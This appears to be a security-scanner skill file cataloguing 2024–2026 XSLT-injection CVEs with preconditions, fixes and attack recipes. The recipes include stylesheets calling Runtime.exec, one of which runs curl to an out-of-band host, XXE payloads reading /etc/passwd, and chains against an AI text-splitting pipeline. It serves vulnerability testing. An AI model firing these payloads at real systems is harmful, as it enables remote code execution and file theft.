---
name: xslt-injection-novel-deep
description: XSLT 2024–2026 frontier — Apache Wicket, Spring XsltView, GeoNetwork Saxon, XMLUnit, IBM DataStage, Apache Camel Quarkus, Pentaho/Hitachi XSLT Transformer Step, HAPI FHIR cluster, libxslt UAF chain, Firefox XSLT UAF cluster, Concrete CMS/Snipe-IT upload-driven delivery, and langchain-text-splitters XSLT XXE
sibling: xslt_injection
load_when: scan_mode == "deep"
---

# XSLT Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `xslt_injection.md`. The base owns the core primitive, the per-processor overview, `document()` dual-use, XSLT 1.0/2.0/3.0 differentials introduction, and the overlap/consolidation with XXE. The advanced+expert sibling `xslt_injection_advanced_deep.md` owns the full per-processor extension-function catalogues with precise function surface, embedded-scripting primitives, XSLT 2.0/3.0 function abuse, Spring XsltView mechanism, Apache FOP/Jasper/Camel pipeline specifics, and WAF filter-bypass as a technique class. This file owns the 2024–2026 CVE mechanism catalogue with the canonical version/fix table, the Apache-ecosystem cluster (Wicket, Camel Quarkus), Spring Framework's XsltView CVE (CVE-2026-47884 — the standout of the catalog at CVSS 9.8 across the Spring Framework 5.3.x → 7.0.x range), the healthcare-standards cluster (HAPI FHIR), the libxslt native-code UAF chain, Firefox client-side XSLT UAF cluster, and emerging-stack anchors (langchain-text-splitters).

Load this file when the goal is matching a target to a current CVE, choosing between extension-function-reach CVEs and parse-side XXE-via-XSLT CVEs, writing up the Spring XsltView finding against a specific framework version, or reasoning about the libxslt and Firefox XSLT UAF cluster.

The 2024–2026 XSLT CVE surface is dense: 25+ verifiable primary-source CVEs across Apache ecosystem (Wicket, Camel Quarkus, Spring XsltView via Framework CVE-2026-47884), healthcare standards (HAPI FHIR cluster), content management (Concrete CMS, Snipe-IT), AI/ML (langchain-text-splitters), native memory corruption (libxslt UAF cluster — CVE-2024-55549, CVE-2025-24855, CVE-2025-7425), client-side XSLT in browsers (Firefox cluster — CVE-2025-1009, CVE-2025-3028, CVE-2025-8032, CVE-2026-100779, CVE-2026-100790), and testing/report tooling (XMLUnit CVE-2024-31573). All version boundaries are anchored to primary sources persisted at `.zen-batch-artifacts/batch-14/nvd/`.

## 2024–2026 CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only.

| CVE | Package / Target | Vulnerable | Patched | CVSS | Primitive class |
|---|---|---|---|---|---|
| CVE-2024-25413 | FireBear Improved Import And Export | ≤ 3.8.6 | per vendor | 7.2 | Server-side XSLT injection via Magento Import Jobs → command execution |
| CVE-2024-33326 | Lumisxp | 15.0.x — 16.1.x | per vendor | 6.1 | XsltResultControllerHtml.jsp XSS |
| CVE-2024-36522 | Apache Wicket | 8.0.0 — 8.15.0 / 9.0.0 — 9.17.0 / 10.0.0-M1 — 10.0.0 | 8.16.0 / 9.18.0 / 10.1.0 | 9.8 | XSLTResourceStream.java — default without FEATURE_SECURE_PROCESSING → RCE via XSLT |
| CVE-2024-45294 | HL7 FHIR Core Artifacts | < 6.3.23 | 6.3.23 | 8.6 | XSLT transforms vulnerable to XXE (XSLT-side configuration enabler) |
| CVE-2024-31573 | XMLUnit for Java (xmlunit-core) | < 2.10.0 | 2.10.0 | 4.0 | Default config did not disable XSLT extension functions → conditional RCE |
| CVE-2024-52007 | HAPI FHIR | per vendor | per vendor | 8.6 | XSLT parsing with XXE via DOCTYPE in input |
| CVE-2024-52800 | veraPDF | per vendor | per vendor | n/a | Policy checks via custom schematron files invoke XSL transformation theoretically allowing attack |
| CVE-2024-52807 | HL7 FHIR IG publisher | < 1.7.4 | 1.7.4 | 8.6 | XSLT transforms vulnerable to XXE |
| CVE-2025-1009 | Firefox / Thunderbird (XSLT UAF) | < 135 | 135 | 9.8 | Use-after-free in XSLT data processing → RCE |
| CVE-2025-1932 | Firefox (XSLT txNodeSorter) | ≥ 122 | per vendor | 8.1 | Inconsistent comparator in txNodeSorter → OOB access |
| CVE-2024-55549 | libxslt | < 1.1.43 | 1.1.43 | 7.8 | `xsltGetInheritedNsList` UAF related to exclusion of result prefixes |
| CVE-2025-24855 | libxslt | < 1.1.43 | 1.1.43 | 7.8 | `numbers.c` UAF — XPath context node modified but not restored |
| CVE-2025-3028 | Firefox XSLTProcessor | < 137 | 137 | 6.5 | JavaScript during XSLT transform leads to UAF |
| CVE-2025-7425 | libxslt | per vendor | per vendor | 7.8 | atype flags corruption; XSLT functions like `key()` corrupt internal memory |
| CVE-2025-8032 | Firefox XSLT CSP bypass | < 141 | 141 | 8.1 | XSLT document loading did not correctly propagate source document → CSP bypass |
| CVE-2025-6985 | langchain-text-splitters | 0.3.8 | per vendor | n/a | `HTMLSectionSplitter` XSLT via lxml parses without hardening — XXE |
| CVE-2025-57785 | Hiawatha webserver | 11.7 | per vendor | 6.5 | Double Free in XSLT `show_index` — unauth attacker corrupt data → ACE potential |
| CVE-2026-79771 | Nokogiri | < 1.19.3 | 1.19.3 | 5.3 | Memory leak in XSLT Stylesheet transform with Ruby strings containing null bytes |
| CVE-2026-47884 | Spring Framework XsltView | 5.3.0 → 5.3.49 / 5.2.25-RELEASE and earlier / 6.0.0 → 6.0.30 / 6.1.0 → 6.1.28 / 6.2.0 → 6.2.19 / 7.0.0 → 7.0.8 | per vendor advisory | 9.8 | `XsltView` in Spring MVC with `/**` mapping → SSRF and RCE |
| CVE-2026-82525 | Exterro FTK Imager | < 8.3 | 8.3 | 5.5 | XSLT-adjacent XXE in XSLT path for file read |
| CVE-2026-58400 | GeoNetwork | < 4.4.12 / < 4.2.17 | 4.4.12 / 4.2.17 | 9.1 | Saxon XSLT processor used to render formatters with `ALLOW_EXTERNAL_FUNCTIONS` — RCE |
| CVE-2026-78224 | Pentaho/Hitachi XSLT Transformer Step | per vendor | per vendor | 8.2 | TransformerFactory without proper security options → XXE |
| CVE-2026-16428 | IBM DataStage on Cloud Pak for Data | 5.4.0.0 | per vendor | 8.8 | Improper configuration of XSLT transformation engine → RCE for authenticated remote attacker |
| CVE-2026-85386 | Concrete CMS | < 9.5.4 | 9.5.4 | 6.1 | Unauth XML/XSLT upload via Form Block — xml-stylesheet PI → XSS |
| CVE-2026-63498 | Snipe-IT | < 8.7.0 | 8.7.0 | 8.7 | API uploaded-files endpoint allows XML/XSLT attachment with `inline=true` → attacker-controlled XSLT execution |
| CVE-2026-100779 | Firefox / Thunderbird (XSLT UAF) | per vendor | Firefox ESR 153.4 / Thunderbird 157 / etc. | 8.8 | Use-after-free in XSLT component |
| CVE-2026-100790 | Firefox / Thunderbird (XSLT UAF) | per vendor | same as above | 8.8 | Use-after-free in XSLT component |
| CVE-2026-88789 | Apache Camel Quarkus (camel-quarkus-support-xalan) | 3.2.0 → 3.33.3 / 3.34.0 → 3.40.0 | 3.33.3 / 3.40.0 | 8.6 | XSLT support extension — bare TransformerFactory without security options → XXE |

Notes on the table:
- **CVE-2026-47884 (Spring Framework XsltView)** is the standout — CVSS 9.8 across a huge Framework range (5.3.0 → 7.0.8). The precondition is specific (`/**` mapping + view name auto-resolved), but Spring MVC applications with those conditions are a large population.
- **CVE-2024-36522 (Apache Wicket)** at CVSS 9.8 is the archetype for "TransformerFactory without FEATURE_SECURE_PROCESSING" — the default was insecure in Wicket 8.x/9.x/10.x; fix enabled secure-processing by default (JIRA WICKET-7201).
- **CVE-2024-31573 (XMLUnit)** at CVSS 4.0 is the mechanism-fingerprint anchor for the test-tooling class — XMLUnit's `TransformerFactoryConfigurer` only called `withDTDLoadingDisabled()` and missed `withExtensionFunctionsDisabled()`. 2.10.0 adds the latter.
- **CVE-2026-58400 (GeoNetwork)** at CVSS 9.1 is Saxon + `ALLOW_EXTERNAL_FUNCTIONS=true` in a metadata-catalog rendering path. The attacker reaches an attacker-controlled formatter stylesheet; Saxon-PE/EE's Java reflection is reachable.
- **The HAPI FHIR cluster (CVE-2024-45294, CVE-2024-52007, CVE-2024-52807)** is XSLT-configuration-enables-XXE. The parse-side mechanism is XXE (owning skill: `xxe.md`); the enabler is the XSLT TransformerFactory configuration. All three CVEs at CVSS 8.6.
- **libxslt UAF cluster (CVE-2024-55549, CVE-2025-24855, CVE-2025-7425)** are native memory corruption in the C library, reachable via crafted stylesheets. UAFs in `xsltGetInheritedNsList`, `numbers.c`, and the `atype`-flag path. All CVSS 7.8. Impact: potential RCE via memory corruption chain; the baseline primitive is DoS.
- **Firefox XSLT UAF cluster (CVE-2025-1009, CVE-2025-1932, CVE-2025-3028, CVE-2025-8032, CVE-2026-100779, CVE-2026-100790)** are client-side primitives — not server-side XSLT injection, but XSLT-engine attack surface worth cross-referencing for defense-in-depth analysis. CVSS up to 9.8.
- **CVE-2026-85386 (Concrete CMS)** at CVSS 6.1 is upload-driven: unauthenticated attacker uploads XML containing `xml-stylesheet` PI pointing to attacker-authored XSLT; the application serves the uploaded XML with permissive content-type, letting the client's browser render it with the attached stylesheet. Low CVSS reflects that the primary impact is XSS (client-side), not server-side RCE.
- **CVE-2026-63498 (Snipe-IT)** at CVSS 8.7 is upload-driven with `inline=true` request parameter — attacker uploads XML/XSLT, requests inline rendering, server-side XSLT processor processes the attacker-authored stylesheet.
- **CVE-2026-16428 (IBM DataStage)** at CVSS 8.8 is authenticated-user to RCE via XSLT transformation engine misconfig.
- **CVE-2026-82525 (Exterro FTK Imager)** at CVSS 5.5 is a Windows-side XSLT XXE in a forensic imaging tool — niche but noted for forensic workflow risk.
- **CVE-2024-25413 (FireBear Improved Import)** at CVSS 7.2 affects Magento's import-job XSLT; command execution via import job XSLT delivery.
- **CVE-2025-6985 (langchain-text-splitters)** is the LLM/AI tooling anchor — `HTMLSectionSplitter` uses `lxml.etree.XSLT()` without hardening; attacker-authored stylesheets or XML inputs reach the lxml XSLT engine with XXE enabled. Routes to `agentic_system_security.md` for the agent-side context.

## CVE Primitive-Class Index

The 25+ XSLT CVEs cluster into five primitive classes. For scanning efficiency, pre-select the class before firing payloads:

| Primitive class | 2024-2026 anchor CVEs | Attack shape | Confirmation signal |
|---|---|---|---|
| **A. Attacker-controlled stylesheet with Java reflection reach** | CVE-2024-36522 (Apache Wicket), CVE-2026-58400 (GeoNetwork Saxon), CVE-2026-47884 (Spring XsltView), CVE-2026-16428 (IBM DataStage), CVE-2024-31573 (XMLUnit), CVE-2024-25413 (FireBear Magento) | `xmlns:rt="http://xml.apache.org/xalan/java/..."` + `rt:getRuntime().exec` | Exec output reflected in transformed response |
| **B. `<msxsl:script>` C# scripting reach** | (no 2024-2026 CVEs anchor this specifically; architecturally present in `.NET + EnableScript=true`) | `<msxsl:script language="C#">...</msxsl:script>` | Reflected .NET-script output |
| **C. XSLT-TransformerFactory enabling parse-side XXE** | CVE-2024-45294 (HAPI FHIR Core), CVE-2024-52007 (HAPI FHIR), CVE-2024-52807 (HL7 IG Publisher), CVE-2026-88789 (Apache Camel Quarkus), CVE-2026-78224 (Pentaho XSLT Transformer Step), CVE-2025-6985 (langchain-text-splitters), CVE-2024-52800 (veraPDF), CVE-2026-82525 (Exterro FTK Imager) | Input XML with external entity in DTD; XSLT TransformerFactory lacks `FEATURE_SECURE_PROCESSING` | File-read content reflected in transformed output |
| **D. Upload-driven delivery (xml-stylesheet PI / inline rendering)** | CVE-2026-85386 (Concrete CMS), CVE-2026-63498 (Snipe-IT) | Attacker uploads XML with `<?xml-stylesheet?>` PI or triggers inline rendering | Stored XSS in app origin OR server-side XSLT exec |
| **E. Native-code memory corruption** | CVE-2024-55549 / CVE-2025-24855 / CVE-2025-7425 (libxslt UAFs), CVE-2025-1009 / 1932 / 3028 / 8032 / 2026-100779 / 100790 (Firefox XSLT UAFs), CVE-2025-57785 (Hiawatha double-free), CVE-2026-79771 (Nokogiri memory leak) | Crafted stylesheet with specific namespace exclusion / XPath nesting / key() usage / repeated-transform patterns | Crash with controlled marker; or memory exhaustion |

## CVE-2026-47884 — Spring Framework XsltView (The Standout)

Primitive: Spring MVC application with `"/**"` mapping that results in view rendering, where the view name is not explicitly specified, lets `XsltView` be reached with attacker-controlled resource URL as the stylesheet source. The processor (typically Xalan or Saxon on the Spring classpath) processes the attacker-authored stylesheet with full extension-function reach.

Preconditions:
1. Spring Framework version in the affected range (5.3.0 → 5.3.49 / 5.2.25-RELEASE and earlier / 6.0.0 → 6.0.30 / 6.1.0 → 6.1.28 / 6.2.0 → 6.2.19 / 7.0.0 → 7.0.8).
2. Spring MVC configuration with `"/**"` mapping.
3. View resolution auto-resolves the view name from the request path (view name not explicitly specified).
4. `XsltView` is a candidate view for the auto-resolved path.
5. XSLT processor configured (Xalan or Saxon) with extension-function reach enabled.

Attack recipe (full chain):

**Step 1 — Reconnaissance: identify Spring MVC `/**` mapping.**
```http
# Spring MVC application typically has a servlet mapping or @GetMapping("/**")
# that reaches XsltView via view-name auto-resolution
GET / HTTP/1.1
# Observe response: Spring Framework stack trace or Boot banner identifies Spring version

GET /actuator/mappings HTTP/1.1
# If Actuator is exposed, confirms routing paths
```

**Step 2 — Verify XsltView auto-resolution.**
```http
GET /any-nonexistent-path HTTP/1.1
# A Spring MVC app that reaches XsltView via /** returns an XSLT-attempted-render error
# (ERR TransformerConfigurationException or similar) rather than a plain 404
```

**Step 3 — Host attacker stylesheet.**
```xml
<!-- At http://attacker.oast.fun/evil.xsl -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <result>
      <xsl:variable name="r" select="rt:getRuntime()"/>
      <xsl:value-of select="rt:exec($r, 'curl http://xyz.oast.fun/exfil')"/>
    </result>
  </xsl:template>
</xsl:stylesheet>
```

**Step 4 — Fire the request that triggers XsltView.**
```http
GET /path-that-resolves-to-attacker-url HTTP/1.1
# The specific path shape depends on the application's routing;
# the finding is "Spring MVC reaches XsltView with attacker-influenced URL"
```

**Confirmation.**
1. **OAST hit on `xyz.oast.fun/exfil`** from the Spring server's IP.
2. **Response body contains exec output** when reflected (depends on view wiring).
3. **TransformerException with Spring MVC + XsltView stack** on malformed stylesheet.

Impact: full RCE as the Spring application server identity. The affected range covers the overwhelming majority of currently-deployed Spring MVC applications; the specific precondition (`/**` + auto-resolve) narrows the vulnerable population, but it is not an uncommon configuration pattern.

Fix: version bumps per Spring Security advisory. Mitigation: do not use `/**` as a catch-all with view-name auto-resolution, OR explicitly disable `XsltView` registration, OR configure the XSLT processor with `FEATURE_SECURE_PROCESSING=true`.

## CVE-2024-36522 — Apache Wicket XSLTResourceStream (The Archetype)

Primitive: `XSLTResourceStream.java` processes XSLT with a default TransformerFactory without `FEATURE_SECURE_PROCESSING`. Attacker-controlled stylesheet source reaches the processor with full Xalan Java reflection reach.

Preconditions:
1. Apache Wicket in the affected range (8.0.0 — 8.15.0 / 9.0.0 — 9.17.0 / 10.0.0-M1 — 10.0.0).
2. Application uses `XSLTResourceStream` with attacker-reachable stylesheet source.
3. Underlying XSLT processor is Xalan (or Saxon-PE/EE with `ALLOW_EXTERNAL_FUNCTIONS=true`).

Sink location per the oss-security disclosure: `XSLTResourceStream.java`'s default configuration does not set `FEATURE_SECURE_PROCESSING = true` on the TransformerFactory. Fix at Wicket 8.16.0 / 9.18.0 / 10.1.0 (JIRA WICKET-7201 "Back-port the XsltTransformer secure-processing hardening") sets the flag by default.

Attack recipe:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

Confirmation: exec output in response or OAST hit.

Impact: full RCE as the Wicket application server identity. Fix: upgrade Wicket, OR explicitly set `FEATURE_SECURE_PROCESSING = true` on any custom TransformerFactory.

## CVE-2026-58400 — GeoNetwork Saxon ALLOW_EXTERNAL_FUNCTIONS

Primitive: GeoNetwork's metadata-catalog formatter rendering uses Saxon with `ALLOW_EXTERNAL_FUNCTIONS=true`. Attacker reaches an attacker-controlled formatter stylesheet via the catalog's formatter-definition path.

Preconditions:
1. GeoNetwork < 4.4.12 or < 4.2.17.
2. Formatter definition path reachable (authenticated or configured per deployment).
3. Saxon XSLT processor with `ALLOW_EXTERNAL_FUNCTIONS=true`.

Attack recipe:
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0"
                xmlns:Runtime="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(), 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

Confirmation: exec output visible in rendered formatter output.

Impact: full RCE as the GeoNetwork application server identity. CVSS 9.1. Fix: upgrade GeoNetwork; disable `ALLOW_EXTERNAL_FUNCTIONS`.

## CVE-2026-88789 — Apache Camel Quarkus XSLT XXE

Primitive: `camel-quarkus-support-xalan` supplies its own Xalan-backed TransformerFactory to the Camel `xslt` component without security options set. Attacker-supplied XML document being transformed can contain external entity declarations.

Preconditions:
1. Camel Quarkus 3.2.0 → 3.33.3 or 3.34.0 → 3.40.0.
2. `camel-quarkus-support-xalan` on the classpath.
3. Camel `xslt` component used in a route that processes attacker-reachable XML.

Attack recipe:
```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>
```
The XML document input to the Camel XSLT component carries an external entity; the TransformerFactory resolves it during transformation.

Confirmation: entity value appears in transformation output or OAST hit.

Impact: file read, SSRF via DTD, DoS via XML bomb. Dual-use with XXE — primary mechanism owner is `xxe.md`; this file's anchor is the XSLT-side configuration enabler.

## CVE-2024-31573 — XMLUnit Default Config Without Extension-Function Disable

Primitive: XMLUnit for Java's default `TransformerFactoryConfigurer` only called `withDTDLoadingDisabled()`; the extension-function-disable call was missing. Any XSLT transformation performed with the default configuration permits extension functions on processors that expose them.

Preconditions:
1. XMLUnit `org.xmlunit:xmlunit-core` < 2.10.0.
2. XSLT transformation via XMLUnit's utilities.
3. Underlying processor exposes extension functions (Saxon-PE/EE or Xalan).

Fix at 2.10.0: `withExtensionFunctionsDisabled()` added to the default configuration + sibling configurers (`SecureProcessing`, `NoDtdButExtensionFunctions`, `NoExternalAccessButExtensionFunctions`).

Impact: conditional RCE — the attack requires both an untrusted stylesheet and a processor with extension-function support. CVSS 4.0 reflects the conditional nature. Grep target build dependencies for pre-2.10.0 XMLUnit; the finding is architectural.

## HAPI FHIR Cluster — XSLT-Enabled XXE

**CVE-2024-45294 (Core, CVSS 8.6), CVE-2024-52007 (HAPI FHIR, CVSS 8.6), CVE-2024-52807 (IG publisher, CVSS 8.6)** all share mechanism: XSLT transforms performed by various FHIR components are vulnerable to XXE because the TransformerFactory does not set `FEATURE_SECURE_PROCESSING`. A processed XML file with a malicious DTD tag produces XML containing data from the host system.

Preconditions:
1. HAPI FHIR Core Artifacts < 6.3.23 or HAPI FHIR per vendor advisory or HL7 FHIR IG publisher < 1.7.4.
2. XSLT transformation processing attacker-reachable XML.

Attack recipe:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd">]>
<FhirResource>&example;</FhirResource>
```

Confirmation: entity contents reflected in transformed output.

Impact: file read on the FHIR server. CVSS 8.6 reflects the production-FHIR context where PHI exposure is high-value. Owning skill decision: `xxe.md` for the parse-side mechanism; XSLT-side here is the configuration enabler.

## IBM DataStage CVE-2026-16428

Primitive: XSLT transformation engine on Cloud Pak for Data 5.4.0.0 is misconfigured, permitting authenticated remote attacker to execute arbitrary code via the XSLT path.

Preconditions:
1. IBM DataStage on Cloud Pak for Data 5.4.0.0.
2. Authenticated remote attacker reaching the XSLT transformation path.

Impact: full RCE as the DataStage server identity. CVSS 8.8.

## Concrete CMS CVE-2026-85386 — Upload-Driven XSS via xml-stylesheet PI

Primitive: Concrete CMS before 9.5.4 did not sanitize XML and XSLT documents uploaded through a public Form Block file-upload question. Plain XML uploads were validated by file extension only and stored as publicly-accessible files served inline from the application's own origin. An unauthenticated visitor could store an XML document containing an `xml-stylesheet` processing instruction that references an attacker-authored (or inline) XSLT stylesheet.

Preconditions:
1. Concrete CMS < 9.5.4.
2. Form Block with file-upload question configured on a public form.
3. Form accepts XML extensions.

Attack recipe:
```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:application/xslt+xml;base64,PAYLOAD_BASE64"?>
<rootElement>
  <!-- Payload XSLT delivered inline as data: URI with XSS content -->
</rootElement>
```

Confirmation: visiting the uploaded XML file in a browser renders the attacker's XSLT, delivering XSS in the application's origin.

Impact: stored XSS in the application's own origin — all origin-scoped primitives are reachable (cookie theft, session riding, SOP bypass). Route to `xss.md` for the XSS-side primitive. CVSS 6.1 reflects XSS impact.

## Snipe-IT CVE-2026-63498 — API Upload with inline=true

Primitive: Snipe-IT's uploaded-files API endpoint `GET /api/v1/{object_type}/{id}/files/{file_id}` with `inline=true` parameter does not apply the safe-inline allowlist used elsewhere, letting authenticated users upload XML/XSLT and request inline rendering.

Preconditions:
1. Snipe-IT < 8.7.0.
2. Attacker holds an authenticated account with file-management access.

Attack recipe: upload XML/XSLT attachment; request via API with `inline=true`; application serves with content-type derived from file extension; browser renders XSLT.

Impact: stored XSS in Snipe-IT's origin; privilege-elevation via admin-reached endpoints. CVSS 8.7 reflects the authenticated+admin-reach impact.

## libxslt Native UAF Cluster

**CVE-2024-55549 (CVSS 7.8):** `xsltGetInheritedNsList` in libxslt before 1.1.43 has a use-after-free related to exclusion of result prefixes. Reachable via crafted XSLT with specific namespace-prefix exclusions.

**CVE-2025-24855 (CVSS 7.8):** `numbers.c` in libxslt before 1.1.43 has UAF because in nested XPath evaluations, an XPath context node can be modified but never restored.

**CVE-2025-7425 (CVSS 7.8):** `atype` flags in libxslt are modified in a way that corrupts internal memory management. When XSLT functions like `key()` are used, the memory corruption manifests.

All three are native-code UAFs in libxslt — baseline impact is DoS (crash); exploitable to RCE via standard libc-reach memory-corruption techniques. Reachable from any libxslt-using application (PHP, Python lxml, Ruby Nokogiri, Node libxmljs) that processes attacker-controlled stylesheets or input XML.

**Nokogiri CVE-2026-79771 (CVSS 5.3):** memory leak (not UAF) in XSLT Stylesheet transform when processing Ruby strings containing null bytes — DoS primitive via memory exhaustion.

## Firefox Client-Side XSLT UAF Cluster

**CVE-2025-1009 (CVSS 9.8):** UAF via crafted XSLT data in Firefox before 135. Potentially exploitable crash → client-side RCE on the renderer process.

**CVE-2025-1932 (CVSS 8.1):** Inconsistent comparator in `xslt/txNodeSorter` could result in OOB access. Affected Firefox ≥ 122.

**CVE-2025-3028 (CVSS 6.5):** JavaScript running during XSLT transformation (via XSLTProcessor) leads to UAF.

**CVE-2025-8032 (CVSS 8.1):** XSLT document loading did not correctly propagate the source document → CSP bypass. Firefox < 141.

**CVE-2026-100779 (CVSS 8.8), CVE-2026-100790 (CVSS 8.8):** Use-after-free in the XSLT component. Fixed in Firefox ESR 153.4, Thunderbird 157.

These are client-side (browser) primitives — not server-side XSLT injection but worth cross-referencing: an attacker-authored XML+XSLT delivered via upload (Concrete CMS CVE-2026-85386 class or any xml-stylesheet PI delivery) can trigger client-side renderer compromise on a visitor's Firefox. The chain: upload → PI delivery → victim visits → Firefox XSLT UAF → renderer RCE.

## langchain-text-splitters CVE-2025-6985 — AI-Tooling XSLT XXE

Primitive: `HTMLSectionSplitter` class in `langchain-text-splitters` 0.3.8 uses `lxml.etree.parse()` and `lxml.etree.XSLT()` for HTML section splitting without hardening. In lxml versions up to 4.9.x, external entities are resolved by default — XSLT path reaches XXE.

Preconditions:
1. langchain-text-splitters 0.3.8.
2. Attacker-reachable HTML input to the splitter (document ingestion in an agentic workflow).
3. lxml backend ≤ 4.9.x.

Attack recipe:
```xml
<?xml version="1.0"?>
<!DOCTYPE html [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<html>&xxe;</html>
```
The splitter parses the HTML as XML through lxml; the XSLT path reaches entity resolution.

Confirmation: file contents in splitter output or OAST hit.

Impact: file read on the agent/pipeline host; cross-document data leak in multi-tenant agent systems. Routes to `agentic_system_security.md` for the agent-side context.

## Pentaho XSLT Transformer Step CVE-2026-78224

Primitive: XSLT Transformer Step builds a bare TransformerFactory without proper security options; XXE possible via attacker-controlled input XML.

Preconditions:
1. Pentaho / Hitachi Vantara data integration platform with XSLT Transformer Step.
2. Attacker-reachable input XML.

Impact: data exfil via XXE; DoS via XML bomb. CVSS 8.2.

## FireBear Magento Import Jobs CVE-2024-25413

Primitive: XSLT Server Side injection in FireBear Improved Import And Export ≤ 3.8.6 — command execution via XSLT delivered through import jobs.

Preconditions:
1. Magento with FireBear Improved Import And Export extension ≤ 3.8.6.
2. Attacker reaches import-job configuration.

Impact: full RCE on Magento server. CVSS 7.2.

## Composite Chains at the Frontier

### Spring XsltView → RCE
1. **Primitive:** CVE-2026-47884 Spring MVC XsltView reached via `/**` auto-resolve.
2. **Reach:** attacker-controlled stylesheet source.
3. **Trigger:** processor runs attacker XSLT with Xalan/Saxon extension-function reach.
4. **Impact:** host RCE.
Route: this file → `rce.md`.

### GeoNetwork → Metadata-Catalog Takeover
1. **Primitive:** CVE-2026-58400 Saxon ALLOW_EXTERNAL_FUNCTIONS reachable via formatter path.
2. **Reach:** Java reflection via XSLT.
3. **Trigger:** `Runtime.exec`.
4. **Impact:** full server RCE + cross-tenant metadata exfil.
Route: this file → `rce.md` + `information_disclosure.md`.

### Concrete CMS Upload → Firefox UAF → Client RCE
1. **Primitive:** CVE-2026-85386 upload XML with xml-stylesheet PI.
2. **Reach:** stored at app origin, served inline.
3. **Trigger:** victim visits with Firefox < 135; CVE-2025-1009 UAF triggers on crafted XSLT.
4. **Impact:** victim's Firefox renderer compromised.
Route: this file (XSLT upload) → `xss.md` (XSS component) → client-side exploitation.

### Camel Quarkus XSLT XXE → ESB Config Exfil
1. **Primitive:** CVE-2026-88789 camel-quarkus-support-xalan TransformerFactory misconfig.
2. **Reach:** attacker-supplied XML reaches Camel route.
3. **Trigger:** external entity resolves on the integration server.
4. **Impact:** data exfil, integration-tier credential exposure.
Route: this file + `xxe.md`.

### langchain-text-splitters → Agent Context Compromise
1. **Primitive:** CVE-2025-6985 HTMLSectionSplitter lxml XSLT XXE.
2. **Reach:** attacker-authored document in agent ingestion pipeline.
3. **Trigger:** XXE resolves during section-splitting.
4. **Impact:** cross-document data leak in agent context.
Route: this file → `agentic_system_security.md`.

### IBM DataStage → RCE on Cloud Pak
1. **Primitive:** CVE-2026-16428 XSLT transformation engine misconfig.
2. **Reach:** authenticated attacker reaching the XSLT path.
3. **Impact:** RCE on the DataStage server; Cloud Pak for Data cross-tenant implications depending on isolation.
Route: this file → `rce.md`.

### Snipe-IT Upload → Server-Side XSLT RCE
1. **Primitive:** CVE-2026-63498 inline=true XSLT rendering.
2. **Reach:** authenticated user with file-management access.
3. **Trigger:** server-side XSLT processor runs attacker stylesheet.
4. **Impact:** server-side XSS or RCE depending on processor config.
Route: this file → `rce.md`.

### libxslt UAF Chain
1. **Primitive:** CVE-2024-55549 / CVE-2025-24855 / CVE-2025-7425 UAFs in libxslt.
2. **Reach:** any libxslt-using application processing attacker XSLT.
3. **Trigger:** crafted stylesheet with specific namespace exclusion / XPath nesting / key() usage.
4. **Impact:** memory corruption → DoS baseline; chain to RCE via standard exploitation.
Route: this file → `rce.md` for memory-corruption-exploitation framing.

## Frontier Detection Methodology

1. **For Spring MVC targets, probe for CVE-2026-47884 preconditions.** Grep for `XsltView` + `/**` mapping + auto-resolve configuration.
2. **For Apache Wicket, confirm version against the affected range.** 8.0.0 — 8.15.0 / 9.0.0 — 9.17.0 / 10.0.0-M1 — 10.0.0 is CVE-2024-36522 territory.
3. **For GeoNetwork and other metadata-catalog targets, probe formatter paths.** Saxon with `ALLOW_EXTERNAL_FUNCTIONS` is the recurring pattern.
4. **For HAPI FHIR tooling, confirm `FEATURE_SECURE_PROCESSING` is explicitly set.** The default-insecure configuration is the finding.
5. **For upload surfaces, test XML + xml-stylesheet PI delivery.** Concrete CMS CVE-2026-85386 class — the finding is "XML upload with permissive content-type."
6. **For AI/agent tooling, confirm lxml version and hardening options.** langchain-text-splitters CVE-2025-6985 class — the finding is "lxml ≤ 4.9.x + XSLT without hardening."
7. **For client-side XSLT scenarios, cross-reference Firefox UAF cluster.** Upload-to-visitor-renderer chains compound.
8. **For libxslt native-code targets, confirm libxslt version.** < 1.1.43 is CVE-2024-55549 / CVE-2025-24855 territory.

## Frontier Validation

- **CVE-2026-47884 (Spring XsltView) claim requires the `/**` + auto-resolve preconditions.** Spring MVC applications without those are not reachable via this CVE.
- **CVE-2024-36522 (Wicket) claim requires Wicket version in range AND Xalan or Saxon with extensions.** A Wicket deployment with Saxon-HE is bounded.
- **CVE-2026-58400 (GeoNetwork) claim requires Saxon-PE/EE AND ALLOW_EXTERNAL_FUNCTIONS=true.** A GeoNetwork deployment with Saxon-HE is not reachable.
- **HAPI FHIR cluster claim requires the parse-side XML to reach the TransformerFactory.** The XSLT configuration is the enabler; the XML path is the entry.
- **libxslt UAF claim requires crash reproduction.** DoS confirmation; RCE requires exploitation development.
- **Firefox UAF claim is client-side.** Server-side writeup should note the client-side nature.

## Pro Tips at the Frontier

- **CVE-2026-47884 (Spring XsltView) has the broadest Spring Framework range in recent memory.** Any Spring MVC application in 5.3.x through 7.0.8 is a candidate; the specific precondition (`/**` + auto-resolve) narrows the vulnerable population.
